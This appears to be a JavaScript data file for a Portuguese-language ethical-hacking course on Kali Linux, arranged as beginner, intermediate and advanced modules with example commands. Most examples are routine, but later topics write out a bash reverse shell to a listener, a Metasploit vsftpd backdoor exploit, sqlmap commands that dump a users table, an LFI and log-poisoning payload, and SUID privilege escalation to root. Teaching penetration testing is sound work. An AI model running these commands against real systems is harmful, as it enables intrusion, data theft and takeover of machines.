import React from 'react';
import { Terminal, Shield, Target, Zap } from 'lucide-react';

export const curriculum = [
  {
    level: "Nível 1: Iniciante (Foundations)",
    description: "Construa a base sólida necessária para qualquer hacker ético. Domine o sistema operacional, redes e a linha de comando.",
    icon: <Terminal className="w-8 h-8 text-green-400" />,
    modules: [
      {
        title: "Módulo 1: Bem-vindo ao Kali Linux 2026",
        topics: [
          {
            title: "O que é o Kali Linux e a mentalidade do Hacker Ético.",
            explanation: "O Kali Linux é uma distribuição baseada em Debian voltada para testes de intrusão (pentest) e auditoria de segurança. A mentalidade do hacker ético envolve usar as mesmas ferramentas e técnicas de um atacante malicioso, mas com permissão e com o objetivo de proteger e corrigir vulnerabilidades.",
            code: "# Não há código específico aqui, mas a atitude é tudo!\necho 'Think like a hacker, act like a professional.'"
          },
          {
            title: "Gerenciamento de pacotes com APT",
            explanation: "O APT (Advanced Package Tool) é o gerenciador de pacotes padrão do Debian/Kali. Manter o sistema atualizado é o primeiro passo de qualquer analista de segurança. O Kali usa um modelo 'rolling release', recebendo atualizações contínuas.",
            code: "# Atualizar a lista de repositórios\nsudo apt update\n\n# Atualizar todos os pacotes instalados\nsudo apt upgrade -y\n\n# Instalar uma nova ferramenta (ex: nmap)\nsudo apt install nmap"
          }
        ]
      },
      {
        title: "Módulo 2: Linux Essentials para Hackers",
        topics: [
          {
            title: "Navegação no sistema de arquivos",
            explanation: "Para se mover rapidamente pelo terminal, você precisa dominar comandos de navegação. 'pwd' mostra onde você está, 'ls' lista os arquivos e 'cd' muda de diretório.",
            code: "# Descobrir o diretório atual\npwd\n\n# Listar arquivos com detalhes e ocultos\nls -la\n\n# Entrar no diretório /etc\ncd /etc\n\n# Voltar para o diretório anterior\ncd -"
          },
          {
            title: "Visualização e edição de texto",
            explanation: "Hackers leem muitos logs e editam arquivos de configuração. Ferramentas como 'cat', 'grep' e 'nano' são essenciais para manipular texto diretamente no terminal.",
            code: "# Ler o conteúdo do arquivo de senhas (apenas usuários)\ncat /etc/passwd\n\n# Filtrar apenas o usuário root\ngrep 'root' /etc/passwd\n\n# Criar/editar um arquivo rapidamente\nnano notes.txt"
          },
          {
            title: "Gerenciamento de permissões",
            explanation: "No Linux, tudo é um arquivo e tem permissões de Leitura (r), Escrita (w) e Execução (x). Alterar essas permissões é crucial para executar scripts ou proteger dados.",
            code: "# Dar permissão de execução a um script\nchmod +x exploit.sh\n\n# Executar o script\n./exploit.sh\n\n# Mudar o dono do arquivo para root\nsudo chown root:root secret.txt"
          }
        ]
      },
      {
        title: "Módulo 3: Fundamentos de Redes (TCP/IP)",
        topics: [
          {
            title: "Ferramentas de diagnóstico de rede",
            explanation: "Antes de atacar uma rede, você precisa entendê-la. Comandos como 'ping' testam a conectividade, 'ip' mostra suas interfaces e 'netstat' ou 'ss' mostram conexões ativas.",
            code: "# Verificar seu próprio IP\nip a\n\n# Testar conectividade com o Google\nping -c 4 8.8.8.8\n\n# Listar todas as portas TCP abertas na sua máquina\nss -tulpn"
          }
        ]
      },
      {
        title: "Módulo 4: Bash Scripting Básico",
        topics: [
          {
            title: "Automatizando tarefas: Ping Sweep",
            explanation: "Um 'Ping Sweep' é usado para descobrir quais hosts estão ativos em uma rede. Em vez de pingar um por um, podemos usar um loop 'for' no Bash para automatizar isso.",
            code: "#!/bin/bash\n# Script simples de Ping Sweep\n\nPREFIX=\"192.168.1\"\n\necho \"Iniciando varredura na rede $PREFIX.0/24...\"\n\nfor IP in {1..254}; do\n  ping -c 1 -W 1 $PREFIX.$IP > /dev/null 2>&1\n  if [ $? -eq 0 ]; then\n    echo \"Host encontrado: $PREFIX.$IP\"\n  fi\ndone\n\necho \"Varredura concluída!\""
          }
        ]
      }
    ],
    lab: {
      title: "Desafio Prático (Lab): Sobrevivência no Terminal",
      description: "Navegue por um sistema de arquivos labiríntico, encontre arquivos ocultos, altere permissões para acessar diretórios restritos e crie um script bash para extrair IPs de um log de servidor Apache."
    }
  },
  {
    level: "Nível 2: Intermediário (Practitioner)",
    description: "Entre no ciclo real do Pentest. Aprenda a encontrar alvos, mapear superfícies de ataque e explorar vulnerabilidades conhecidas.",
    icon: <Target className="w-8 h-8 text-blue-400" />,
    modules: [
      {
        title: "Módulo 1: O Ciclo do Pentest & OSINT",
        topics: [
          {
            title: "Information Gathering Passivo (OSINT)",
            explanation: "OSINT (Open Source Intelligence) envolve coletar dados públicos sobre o alvo antes de tocá-lo. Ferramentas como 'theHarvester' buscam e-mails, subdomínios e IPs em fontes públicas.",
            code: "# Buscar e-mails e domínios relacionados a um alvo usando o theHarvester\ntheHarvester -d kali.org -b google,linkedin -l 500"
          }
        ]
      },
      {
        title: "Módulo 2: Scanning & Enumeration",
        topics: [
          {
            title: "Nmap Ninja: Escaneamentos furtivos",
            explanation: "O Nmap é o canivete suíço do reconhecimento de redes. Um escaneamento 'SYN' (-sS) é rápido e furtivo. Usamos -sV para detectar versões de serviços rodando nas portas abertas.",
            code: "# Escaneamento SYN furtivo com detecção de versão e OS\nsudo nmap -sS -sV -O 192.168.1.100\n\n# Escanear todas as 65535 portas rapidamente\nsudo nmap -p- -T4 192.168.1.100\n\n# Usar scripts de vulnerabilidade padrão do Nmap\nnmap --script vuln 192.168.1.100"
          },
          {
            title: "Netcat (nc) para Pentest",
            explanation: "O Netcat é usado para ler e escrever dados através de conexões de rede. É frequentemente usado para criar 'Reverse Shells', onde a máquina vítima se conecta de volta à máquina do atacante.",
            code: "# Na máquina do ATACANTE (ouvindo na porta 4444)\nnc -lvnp 4444\n\n# Na máquina da VÍTIMA (enviando o shell para o atacante)\n# (Exemplo em bash)\nbash -i >& /dev/tcp/10.0.0.5/4444 0>&1"
          }
        ]
      },
      {
        title: "Módulo 3: Exploração Básica com Metasploit",
        topics: [
          {
            title: "Arquitetura do Metasploit (msfconsole)",
            explanation: "O Metasploit Framework é uma plataforma para desenvolver e executar exploits. Ele possui módulos de exploit (o ataque), payloads (o que roda após o ataque) e auxiliares (scanners).",
            code: "# Iniciar o banco de dados e o console\nsudo msfdb init\nmsfconsole\n\n# Comandos dentro do msfconsole:\n# search vsftpd 2.3.4\n# use exploit/unix/ftp/vsftpd_234_backdoor\n# set RHOSTS 192.168.1.100\n# exploit"
          }
        ]
      }
    ],
    lab: {
      title: "Desafio Prático (Lab): Invadindo a Primeira Máquina",
      description: "Dado um IP alvo na rede do laboratório, realize o reconhecimento, identifique um serviço FTP vulnerável, encontre o exploit correspondente no Searchsploit ou Metasploit e obtenha uma shell de baixo privilégio."
    }
  },
  {
    level: "Nível 3: Avançado (Specialist)",
    description: "Eleve suas habilidades. Domine a exploração de aplicações web, escale privilégios em sistemas comprometidos e ataque redes sem fio.",
    icon: <Zap className="w-8 h-8 text-yellow-400" />,
    modules: [
      {
        title: "Módulo 1: Pentest Web (OWASP Top 10)",
        topics: [
          {
            title: "Injeção de SQL (SQLi) com SQLmap",
            explanation: "SQL Injection ocorre quando a entrada do usuário interfere nas consultas do banco de dados. O SQLmap automatiza a detecção e exploração dessas falhas.",
            code: "# Testar um parâmetro de URL vulnerável\nsqlmap -u \"http://testphp.vulnweb.com/artists.php?artist=1\" --dbs\n\n# Extrair tabelas de um banco de dados específico\nsqlmap -u \"http://testphp.vulnweb.com/artists.php?artist=1\" -D acuart --tables\n\n# Dump dos dados de uma tabela\nsqlmap -u \"http://testphp.vulnweb.com/artists.php?artist=1\" -D acuart -T users --dump"
          },
          {
            title: "Directory Traversal e LFI",
            explanation: "Local File Inclusion (LFI) permite que um atacante leia arquivos sensíveis do servidor (como /etc/passwd) manipulando parâmetros de inclusão de arquivos na URL.",
            code: "# Exemplo de URL vulnerável a LFI\nhttp://alvo.com/index.php?page=../../../../../../etc/passwd\n\n# LFI para RCE (Remote Code Execution) via log poisoning\n# 1. Injetar código PHP no User-Agent via Netcat\n# 2. Acessar o log via LFI:\nhttp://alvo.com/index.php?page=/var/log/apache2/access.log&cmd=id"
          }
        ]
      },
      {
        title: "Módulo 2: Privilege Escalation (Linux)",
        topics: [
          {
            title: "Exploração de permissões SUID",
            explanation: "Arquivos com a permissão SUID (Set Owner User ID) executam com os privilégios do dono do arquivo (geralmente root). Se um binário comum como 'find' ou 'vim' tiver SUID, podemos usá-lo para virar root.",
            code: "# Encontrar todos os arquivos com SUID no sistema\nfind / -perm -4000 -type f -exec ls -la {} \\; 2>/dev/null\n\n# Se o binário 'find' tiver SUID, podemos escalar privilégios assim:\nfind . -exec /bin/sh -p \\; -quit"
          }
        ]
      }
    ],
    lab: {
      title: "Desafio Prático (Lab): O Caminho para o Root",
      description: "Explore uma vulnerabilidade de LFI em uma aplicação web para obter acesso inicial (www-data). Em seguida, enumere o sistema Linux, encontre um binário com SUID mal configurado e escale seus privilégios para root, capturando a flag final."
    }
  }
];
